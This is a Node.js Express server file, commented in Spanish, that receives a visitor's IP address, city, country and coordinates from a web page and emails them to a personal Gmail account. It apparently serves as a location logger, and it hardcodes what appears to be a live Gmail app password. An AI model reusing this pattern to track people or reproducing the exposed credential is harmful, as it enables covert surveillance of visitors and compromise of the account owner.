require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express(); // 🔥 Aquí definimos "app"

app.use(cors());
app.use(bodyParser.json());

// 📂 Servir archivos estáticos desde "public"
app.use(express.static(path.join(__dirname, 'public')));

// Configuración de Nodemailer
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'maximilianoalderete017@gmail.com', // Reemplaza con tu correo
        pass: 'nsgx vuam sfrt hmqe' // Usa una contraseña de aplicación si tienes 2FA activado
    }
});

app.post('/enviar-ubicacion', (req, res) => {
    console.log("📩 Datos recibidos en el backend:", req.body); // ✅ Verifica en la terminal

    const { ciudad, pais, ip, longitud, latitud } = req.body;

    if (!ciudad || !pais || !ip) {
        return res.status(400).send("❌ Faltan datos de ubicación.");
    }

    console.log(`✅ Ubicación recibida: ${ciudad}, ${pais}, ${ip}`);

    const mailOptions = {
        from: 'tuemail@gmail.com',
        to: 'maximilianoalderete017@gmail.com',
        subject: 'Nueva Ubicación Detectada',
        text: `📍 Ciudad: ${ciudad}\n🌎 País: ${pais}\n💻 IP: ${ip} \n💻 latitud: ${latitud} \n💻 longitud: ${longitud}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error("❌ Error enviando el correo:", error);
            return res.status(500).send('Error al enviar el correo');
        } else {
            console.log("✅ Correo enviado:", info.response);
            return res.status(200).send("Ubicación enviada correctamente");
        }
    });
});


// Ruta para servir "index.html" cuando se accede a "/"
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar el servidor
app.listen(3000, () => {
    console.log('Servidor corriendo en https://gail.onrender.com/');
});
